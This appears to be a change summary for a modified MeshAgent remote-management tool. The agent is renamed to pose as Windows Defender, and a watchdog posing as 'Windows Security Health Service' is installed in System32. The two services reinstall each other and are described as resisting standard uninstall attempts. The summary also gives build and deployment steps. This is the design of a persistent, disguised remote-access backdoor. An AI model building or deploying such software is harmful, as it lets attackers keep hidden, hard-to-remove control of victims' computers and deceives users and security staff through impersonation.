# MeshAgent - Guardian Protection System

## Changes Summary

### Service Renaming
- Main service renamed from "Mesh Agent" to "Windows Defender Service"
- Service display name: "Windows Defender background service"
- Installation path changed from `C:\Program Files\Mesh Agent\` to `C:\Program Files\Windows Defender\`
- Logo replaced with custom 96x96 icon (38078 bytes)

### Guardian Service (Watchdog)
- New Guardian service: "Windows Security Health Service"
- Executable: `WinSecHealthSvc.exe`
- Installation path: `C:\Windows\System32\WinSecHealth\`
- Service type: Automatic start, Windows Service

### Mutual Protection System
- Main service installs Guardian on first start
- Main service monitors Guardian every 60 seconds
- Guardian monitors main service every 10 seconds
- Both services reinstall each other if missing or stopped
- Guardian backs up main service files hourly (exe, .msh, .db)

### File Structure
```
meshguardian/
  - guardian.h              (Header with definitions and function declarations)
  - guardian.c              (Complete Guardian service implementation)
  - MeshGuardian-2022.vcxproj (Visual Studio project file)

meshservice/
  - ServiceMain.c           (Modified to install and monitor Guardian)
  - MeshService.ico         (New logo 38078 bytes)

meshconsole/
  - MeshService.ico         (New logo 38078 bytes)

meshreset/
  - main.c                  (Updated paths and service names)

uninstall.ps1               (PowerShell script to remove both services)
```

### Guardian Behavior
- Check interval: 10 seconds
- Backup interval: 1 hour
- Backup location: `C:\Windows\System32\WinSecHealth\backup\`
- Log file: `C:\Windows\System32\WinSecHealth\service.log` (max 50KB with rotation)
- Monitors: Service existence, service running status, file presence
- Auto-restores: Reinstalls main service if deleted or stopped

### Uninstallation
Run `uninstall.ps1` as Administrator to remove both services completely:
- Stops both services
- Uninstalls service registrations
- Removes all files and directories
- Cleans registry keys

### Modified Files
1. `meshservice/ServiceMain.c` - Added Guardian installation and monitoring functions
2. `meshservice/MeshService.rc` - Updated service names and descriptions
3. `meshservice/MeshService64.rc` - Updated 64-bit resource file
4. `meshreset/main.c` - Updated paths and service names
5. `meshservice/MeshService.ico` - Replaced logo
6. `meshconsole/MeshService.ico` - Replaced logo

### New Files
1. `meshguardian/guardian.h` - Guardian service header
2. `meshguardian/guardian.c` - Guardian service implementation
3. `meshguardian/MeshGuardian-2022.vcxproj` - Visual Studio project
4. `uninstall.ps1` - Complete uninstaller script

### Build Instructions
1. Open `MeshAgent-2022.sln` in Visual Studio
2. Build MeshService-2022 project (creates `MeshAgent.exe`)
3. Build MeshGuardian-2022 project (creates `WinSecHealthSvc.exe`)
4. Both executables must be in the same directory during installation

### Deployment
1. Place both `MeshAgent.exe` and `WinSecHealthSvc.exe` in the same folder
2. Install main service (it will auto-install Guardian)
3. Guardian will be copied to `C:\Windows\System32\WinSecHealth\`
4. Both services will start automatically and protect each other

### Protection Features
- Mutual monitoring prevents single-point removal
- Guardian resists standard uninstall attempts
- Only `uninstall.ps1` can remove both services cleanly
- Hourly backups enable recovery from corruption
- Automatic reinstallation if either service is deleted
